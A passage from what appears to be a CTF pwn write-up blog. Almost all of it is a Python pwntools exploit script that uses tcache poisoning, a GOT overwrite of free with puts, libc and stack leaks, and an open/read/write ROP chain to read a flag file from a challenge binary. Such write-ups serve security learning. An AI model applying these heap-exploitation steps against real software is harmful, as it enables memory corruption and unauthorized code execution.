class="string">b&quot;&quot;</span>).decode(), <span class="number">16</span>) - HEAP_OFFT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enable_print</span>(<span class="params">idx</span>):</span><br><span class="line">        edit(idx, <span class="string">b&quot;&quot;</span>.join([</span><br><span class="line">            pwn.p64(<span class="number">0</span>)</span><br><span class="line">        ]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">libc_leak_free</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Option: &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        <span class="keyword">return</span> pwn.unpack(io.recvline().replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - STDOUT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">leak_environ</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Option: &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        <span class="keyword">return</span> pwn.unpack(io.recvline().replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    init(<span class="string">b&quot;m&quot;</span>*<span class="number">4</span> + pwn.p8(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>, <span class="string">b&quot;K&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_leak = heapLeak(<span class="number">1</span>)</span><br><span class="line">    pwn.log.success(<span class="string">f&quot;heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap_leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># victim</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="string">b&quot;&quot;</span>.join([   <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span>,</span><br><span class="line">                        pwn.p64(<span class="number">0</span>), <span class="comment"># prev_sz</span></span><br><span class="line">                        pwn.p64(<span class="number">0x21</span>) <span class="comment"># fake size</span></span><br><span class="line">                    ]))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">4</span>, <span class="string">b&quot;&quot;</span>.join([   <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span>,</span><br><span class="line">                        pwn.p64(<span class="number">0</span>), <span class="comment"># prev_sz</span></span><br><span class="line">                        pwn.p64(<span class="number">0x21</span>) <span class="comment"># fake size</span></span><br><span class="line">                    ]))</span><br><span class="line">    free(<span class="number">4</span>) <span class="comment"># count for 0x40 tcachebin = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># chunk2 =&gt; sz extended</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">b&quot;K&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">    <span class="comment"># chunk2 =&gt; tcachebin 0x40, count = 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># oob write over chunk3, we keep valid header</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="string">b&quot;&quot;</span>.join([   pwn.p64(<span class="number">0</span>)*<span class="number">3</span>,</span><br><span class="line">                        pwn.p64(<span class="number">0x41</span>) <span class="comment"># valid size to end up in the 0x40 tcache bin</span></span><br><span class="line">                    ])) <span class="comment"># count = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># chunk3 =&gt; 0x40 tcachebin, count = 2</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;Encrypted fp: <span class="subst">&#123;<span class="built_in">hex</span>(encode_ptr(heap_leak, CHUNK3_OFFT, exe.got.printf))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&quot;&quot;</span>.join([   pwn.p64(<span class="number">0</span>)*<span class="number">3</span>,</span><br><span class="line">                         pwn.p64(<span class="number">0x41</span>), <span class="comment"># valid size</span></span><br><span class="line">                         pwn.p64(encode_ptr(heap_leak, CHUNK3_OFFT, exe.sym.books)) <span class="comment"># forward ptr</span></span><br><span class="line">                     ]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dumb</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>) <span class="comment"># count = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># arbitrary write to @books, this way books[1] is user controlled</span></span><br><span class="line">    add(<span class="number">4</span>, <span class="string">b&quot;&quot;</span>.join([</span><br><span class="line">        pwn.p64(<span class="number">0x1000</span>), <span class="comment"># sz</span></span><br><span class="line">        pwn.p64(exe.sym.books), <span class="comment"># target</span></span><br><span class="line">        <span class="string">b&quot;P&quot;</span>*<span class="number">0x10</span></span><br><span class="line">    ])) <span class="comment"># count = 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># we can write way more due to the previous call</span></span><br><span class="line">    edit(<span class="number">1</span>, pwn.flat([</span><br><span class="line">            <span class="comment"># 1==</span></span><br><span class="line">            <span class="number">0xff</span>, <span class="comment"># sz</span></span><br><span class="line">            exe.sym.stdout, <span class="comment"># target</span></span><br><span class="line">            <span class="comment"># 2==</span></span><br><span class="line">            <span class="number">0x8</span>, <span class="comment"># sz</span></span><br><span class="line">            exe.got.free, <span class="comment"># target</span></span><br><span class="line">            <span class="comment"># 3==</span></span><br><span class="line">            <span class="number">0x8</span>, <span class="comment"># sz</span></span><br><span class="line">            exe.sym.secret_msg, <span class="comment"># target</span></span><br><span class="line">            <span class="comment"># 4==</span></span><br><span class="line">            <span class="number">0xff</span>, <span class="comment"># sz</span></span><br><span class="line">            exe.sym.books <span class="comment"># target</span></span><br><span class="line">        ] + [<span class="number">0</span>] * <span class="number">0x60</span>, filler = <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># free@got =&gt; puts</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&quot;&quot;</span>.join([</span><br><span class="line">            pwn.p64(exe.sym.puts)</span><br><span class="line">        ]))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># can print = true</span></span><br><span class="line">    enable_print(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># libc leak</span></span><br><span class="line">    libc.address = libc_leak_free(<span class="number">1</span>)</span><br><span class="line">    pwn.log.success(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak stack (environ)</span></span><br><span class="line">    edit(<span class="number">4</span>, pwn.flat([</span><br><span class="line">            <span class="comment"># 1==</span></span><br><span class="line">            <span class="number">0xff</span>, <span class="comment"># sz</span></span><br><span class="line">            libc.sym.environ <span class="comment"># target</span></span><br><span class="line">        ], filler = <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    environ = leak_environ(<span class="number">1</span>)</span><br><span class="line">    pwn.log.success(<span class="string">f&quot;environ: <span class="subst">&#123;<span class="built_in">hex</span>(environ)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    stackframe_rewrite = environ - <span class="number">0x150</span></span><br><span class="line">    pwn.log.success(<span class="string">f&quot;stackframe_rewrite: <span class="subst">&#123;<span class="built_in">hex</span>(stackframe_rewrite)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rop = pwn.ROP(libc, base=stackframe_rewrite)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># setup the write to the rewrite stackframe</span></span><br><span class="line">    edit(<span class="number">4</span>, pwn.flat([</span><br><span class="line">            <span class="comment"># 1==</span></span><br><span class="line">            <span class="number">0xff</span>, <span class="comment"># sz</span></span><br><span class="line">            stackframe_rewrite <span class="comment"># target</span></span><br><span class="line">        ], filler = <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ROPchain</span></span><br><span class="line">    rop(rax=pwn.constants.SYS_open, rdi=stackframe_rewrite + <span class="number">0xde</span> + <span class="number">2</span>, rsi=pwn.constants.O_RDONLY) <span class="comment"># open</span></span><br><span class="line">    rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">    rop(rax=pwn.constants.SYS_read, rdi=<span class="number">3</span>, rsi=heap_leak, rdx=<span class="number">0x100</span>) <span class="comment"># file descriptor bf ...</span></span><br><span class="line">    rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    rop(rax=pwn.constants.SYS_write, rdi=<span class="number">1</span>, rsi=heap_leak, rdx=<span class="number">0x100</span>) <span class="comment"># write</span></span><br><span class="line">    rop.call(rop.find_gadget([<span class="string">&quot;syscall&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">    rop.exit(<span class="number">0x1337</span>)</span><br><span class="line">    rop.raw(<span class="string">b&quot;/flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(rop.dump())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(rop.chain()) - <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write and trigger the ROPchain</span></span><br><span class="line">    edit(<span class="number">1</span>, rop.chain())</span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/posts/mailman/"
      title="[ImaginaryCTF 2023 - pwn] mailman"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        [ImaginaryCTF 2023 - pwn] mailman
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/posts/cs2101/"
      title="[HackTM finals 2023 - pwn] cs2101"
     >

    <p class="title-text">
      
        [HackTM finals 2023 - pwn] cs2101
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 nasm<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
